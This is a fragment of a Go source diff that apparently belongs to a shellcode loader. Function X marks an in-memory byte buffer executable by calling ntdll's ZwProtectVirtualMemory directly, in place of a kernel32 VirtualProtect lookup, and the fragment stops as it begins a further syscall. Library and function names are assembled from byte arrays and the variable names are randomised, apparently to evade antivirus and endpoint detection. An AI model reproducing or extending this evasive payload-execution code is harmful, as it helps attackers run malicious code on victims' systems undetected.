@@ -5,42 +5,26 @@ import (
 	"unsafe"
 )
 
-var (
-	proc42526789738d uintptr
-)
-
 const (
-	PAGE_EXECUTE_READ = 0x20
+	PAGE_EXECUTE_READ uintptr = 0x20
 )
-
-func Init() error {
-	modKernel32, err := syscall.LoadLibrary(string([]byte{
-		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
-	}))
-	if err != nil {
-		return err
-	}
-
-	proc42526789738d, err = syscall.GetProcAddress(modKernel32, string([]byte{
-		'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't',
-	}))
-	if err != nil {
-		return err
-	}
-
-	return nil
-}
 
 func X(buf []byte) {
+	var hProcess uintptr = 0
+	var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
+	var dwBufferLen = uint32(len(buf))
 	var dwOldPerm uint32
-	syscall.Syscall6(
-		proc42526789738d,
-		4,
-		uintptr(unsafe.Pointer(&buf[0])),
-		uintptr(len(buf)),
-		uintptr(PAGE_EXECUTE_READWRITE),
+
+	syscall.NewLazyDLL(string([]byte{
+		'n', 't', 'd', 'l', 'l',
+	})).NewProc(string([]byte{
+		'Z', 'w', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y',
+	})).Call(
+		hProcess-1,
+		uintptr(unsafe.Pointer(&pBaseAddr)),
+		uintptr(unsafe.Pointer(&dwBufferLen)),
+		PAGE_EXECUTE_READ,
 		uintptr(unsafe.Pointer(&dwOldPerm)),
-		0, 0,
 	)
 
 	syscall.Syscall(
